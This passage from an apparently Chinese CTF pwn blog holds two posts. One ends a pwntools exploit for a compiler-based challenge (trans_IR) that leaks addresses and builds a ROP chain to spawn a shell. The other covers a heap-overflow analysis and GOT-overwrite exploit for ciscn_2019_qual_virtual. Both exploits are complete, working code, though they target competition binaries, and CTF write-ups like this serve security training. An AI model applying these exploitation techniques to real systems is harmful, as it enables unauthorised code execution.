class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./trans_IR&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.77.77&#x27;</span>,<span class="string">&#x27;2102&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x72EC)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;5.exit&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line">code = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">int main()&#123;</span></span><br><span class="line"><span class="string">    int a;</span></span><br><span class="line"><span class="string">    struct test t;</span></span><br><span class="line"><span class="string">	int arr[255][255][255][255][255][255][255];</span></span><br><span class="line"><span class="string">    arr[32][255][255][255][255][255][a]=0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">cmd(<span class="number">4</span>)	</span><br><span class="line">sla(<span class="string">&quot;input code:&quot;</span>,code)</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;第6行：&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0xa970</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">code = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">int main()&#123;</span></span><br><span class="line"><span class="string">    int a;</span></span><br><span class="line"><span class="string">    struct test t;</span></span><br><span class="line"><span class="string">	int arr[255][255][255][255][255][255][255];</span></span><br><span class="line"><span class="string">    arr[48][255][255][255][255][255][a]=0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">cmd(<span class="number">4</span>)	</span><br><span class="line">sla(<span class="string">&quot;input code:&quot;</span>,code)</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;第6行：&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">pro_base = leak_addr - <span class="number">0xa10a</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;pro_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(pro_base))</span><br><span class="line"></span><br><span class="line">bss_addr = pro_base + <span class="number">0x19040</span> + <span class="number">0x200</span></span><br><span class="line">system = pro_base + <span class="number">0xCD92</span></span><br><span class="line">pop_rdi = pro_base + <span class="number">0x00000000000125b3</span></span><br><span class="line">success(<span class="string">&quot;system &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">success(<span class="string">&quot;pop_rdi &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(pop_rdi))</span><br><span class="line"></span><br><span class="line">stack_heap = heap_base + <span class="number">0x11f20</span> +<span class="number">1</span>-<span class="number">0x30</span> </span><br><span class="line">success(<span class="string">&quot;stack_heap &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(stack_heap))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">stack_heaps = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    stack_heaps.append((stack_heap&gt;&gt;(<span class="number">8</span>*i)) % <span class="number">256</span>)</span><br><span class="line"><span class="built_in">print</span>(stack_heaps)</span><br><span class="line"></span><br><span class="line">code = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">int main()&#123;</span></span><br><span class="line"><span class="string">    int a;</span></span><br><span class="line"><span class="string">    struct test t;</span></span><br><span class="line"><span class="string">	int arr[255][255][255][255][255][255][255][255][255];</span></span><br><span class="line"><span class="string">    arr[%s][%s][%s][255][255][255][255][255][a]=0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span> % (stack_heaps[<span class="number">2</span>],stack_heaps[<span class="number">1</span>],stack_heaps[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">cmd(<span class="number">4</span>)	</span><br><span class="line">sla(<span class="string">&quot;input code:&quot;</span>,code)</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;第6行：&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">7</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">canary_stack = leak_addr * <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;canary_stack &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(canary_stack))</span><br><span class="line"></span><br><span class="line">canary_stacks = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    canary_stacks.append((canary_stack&gt;&gt;(<span class="number">8</span>*i)) % <span class="number">256</span>)</span><br><span class="line"><span class="built_in">print</span>(canary_stacks)</span><br><span class="line"></span><br><span class="line">bss_addrs = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    bss_addrs.append((bss_addr&gt;&gt;(<span class="number">8</span>*i)) % <span class="number">256</span>)</span><br><span class="line"><span class="built_in">print</span>(bss_addrs)</span><br><span class="line"></span><br><span class="line">systems = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    systems.append((system&gt;&gt;(<span class="number">8</span>*i)) % <span class="number">256</span>)</span><br><span class="line"><span class="built_in">print</span>(systems)</span><br><span class="line"></span><br><span class="line">pop_rdis = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    pop_rdis.append((pop_rdi&gt;&gt;(<span class="number">8</span>*i)) % <span class="number">256</span>)</span><br><span class="line"><span class="built_in">print</span>(pop_rdis)</span><br><span class="line"></span><br><span class="line">code = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">int main()&#123;</span></span><br><span class="line"><span class="string">	cat ./flag;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">cmd(<span class="number">4</span>)	</span><br><span class="line">sla(<span class="string">&quot;input code:&quot;</span>,code)</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">binsh = heap_base +<span class="number">0x199fe</span></span><br><span class="line">binshs = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    binshs.append((binsh&gt;&gt;(<span class="number">8</span>*i)) % <span class="number">256</span>)</span><br><span class="line"><span class="built_in">print</span>(binshs)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">code = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">int main()&#123;</span></span><br><span class="line"><span class="string">	int arr[255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255][255];</span></span><br><span class="line"><span class="string">    arr[%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][0][0][0][0][0][0][0][0][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][%s][255][255][255][255][255][255]=0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span> % (systems[<span class="number">7</span>],systems[<span class="number">6</span>],systems[<span class="number">5</span>],systems[<span class="number">4</span>],</span><br><span class="line">       systems[<span class="number">3</span>],systems[<span class="number">2</span>],systems[<span class="number">1</span>],systems[<span class="number">0</span>],</span><br><span class="line">       binshs[<span class="number">7</span>],binshs[<span class="number">6</span>],binshs[<span class="number">5</span>],binshs[<span class="number">4</span>],</span><br><span class="line">       binshs[<span class="number">3</span>],binshs[<span class="number">2</span>],binshs[<span class="number">1</span>],binshs[<span class="number">0</span>],</span><br><span class="line">       pop_rdis[<span class="number">7</span>],pop_rdis[<span class="number">6</span>],pop_rdis[<span class="number">5</span>],pop_rdis[<span class="number">4</span>],</span><br><span class="line">       pop_rdis[<span class="number">3</span>],pop_rdis[<span class="number">2</span>],pop_rdis[<span class="number">1</span>],pop_rdis[<span class="number">0</span>],</span><br><span class="line">       canary_stacks[<span class="number">7</span>],canary_stacks[<span class="number">6</span>],canary_stacks[<span class="number">5</span>],canary_stacks[<span class="number">4</span>],</span><br><span class="line">       canary_stacks[<span class="number">3</span>],canary_stacks[<span class="number">2</span>],canary_stacks[<span class="number">1</span>],canary_stacks[<span class="number">0</span>],</span><br><span class="line">       bss_addrs[<span class="number">7</span>],bss_addrs[<span class="number">6</span>],bss_addrs[<span class="number">5</span>],bss_addrs[<span class="number">4</span>],</span><br><span class="line">       bss_addrs[<span class="number">3</span>],bss_addrs[<span class="number">2</span>],bss_addrs[<span class="number">1</span>],bss_addrs[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">cmd(<span class="number">4</span>)	</span><br><span class="line">sla(<span class="string">&quot;input code:&quot;</span>,code)</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>出这个题目之前正好在学编译原理，我当时在做编译器 Lab 的时候就遇到了溢出的相关问题，于是就干脆把我做 Lab 时写的编译器拿出来改了改，弄了个 pwn 出来</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/20/VM%20pwn+%E5%A0%86%E6%BA%A2%E5%87%BA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/06/20/VM%20pwn+%E5%A0%86%E6%BA%A2%E5%87%BA/" class="post-title-link" itemprop="url">VM pwn+堆溢出</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-06-20 02:32:37 / Modified: 02:34:40" itemprop="dateCreated datePublished" datetime="2023-06-20T02:32:37+08:00">2023-06-20</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>3k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>3 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>qual_virtual</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ciscn_2019_qual_virtual: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=<span class="number">3</span>d563a19678c3cec2fafbd07e6817b248c869819, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，Canary，NX</li>
</ul>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( do_mov_out(data, &amp;temp) )</span><br><span class="line">  <span class="keyword">return</span> do_mov_in(data, data-&gt;chunk[data-&gt;index + temp]);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !do_mov_out(data, &amp;temp1) || !do_mov_out(data, &amp;temp2) )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">data-&gt;chunk[data-&gt;index + temp1] = temp2;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1LL</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>在 Load 和 Save 指令中存在堆溢出</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>由于本题目不能随意控制 malloc 和 free，因此优先考虑打 GOT 表</p>
<p>仔细观察堆布局就可以发现破绽：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x1b822c0</span> <span class="comment">/* stack */</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x1b822c0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x1b822c8</span> ◂— <span class="number">0x21</span> <span class="comment">/* &#x27;!&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x1b822d0</span> —▸ <span class="number">0x1b822f0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x1b822d8</span> ◂— <span class="number">0xffffffff00000040</span> <span class="comment">/* &#x27;@&#x27; */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x1b822e0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x1b822e8</span> ◂— <span class="number">0x211</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x1b822f0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x1b822f8</span> ◂— <span class="number">0x0</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x1b824f0</span> <span class="comment">/* code */</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x1b824f0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x1b824f8</span> ◂— <span class="number">0x21</span> <span class="comment">/* &#x27;!&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x1b82500</span> —▸ <span class="number">0x1b82520</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x1b82508</span> ◂— <span class="number">0xffffffff00000080</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x1b82510</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x1b82518</span> ◂— <span class="number">0x411</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x1b82520</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x1b82528</span> ◂— <span class="number">0x0</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x1b82920</span> <span class="comment">/* data */</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x1b82920</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x1b82928</span> ◂— <span class="number">0x21</span> <span class="comment">/* &#x27;!&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x1b82930</span> —▸ <span class="number">0x1b82950</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x1b82938</span> ◂— <span class="number">0xffffffff00000040</span> <span class="comment">/* &#x27;@&#x27; */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x1b82940</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x1b82948</span> ◂— <span class="number">0x211</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x1b82950</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x1b82958</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>每个 get_Chunk 函数都会生成两个堆块，第一个堆块用于存放控制信息，而第二个堆块中可以任意堆溢出</li>
<li>只需要覆盖第一个堆块上的堆地址为 GOT 表地址，就可以控制 GOT 表</li>
</ul>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./ciscn_2019_qual_virtual1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *0x4019E2&quot;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b *$rebase(0x1409)\nb *$rebase(0x137A)\n&quot;)</span></span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">name = <span class="string">&quot;/bin/sh\x00&quot;</span></span><br><span class="line">opcode = <span class="string">&quot;push push push save push sub pop&quot;</span></span><br><span class="line">stack = <span class="string">&quot;205200 4210720 -208 0&quot;</span> </span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;Your program name:&quot;</span>,name)</span><br><span class="line">sla(<span class="string">&quot;Your instruction:&quot;</span>,opcode)</span><br><span class="line">sla(<span class="string">&quot;Your stack data:&quot;</span>,stack)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/19/%E5%9B%BD%E8%B5%9B-%E5%8D%8A%E5%86%B3%E8%B5%9B2023/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/06/19/%E5%9B%BD%E8%B5%9B-%E5%8D%8A%E5%86%B3%E8%B5%9B2023/" class="post-title-link" itemprop="url">国赛-半决赛2023</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-06-19 03:33:09 / Modified: 03:34:06" itemprop="dateCreated datePublished" datetime="2023-06-19T03:33:09+08:00">2023-06-19</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Competition/" itemprop="url" rel="index"><span itemprop="name">Competition</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>19k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>18 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
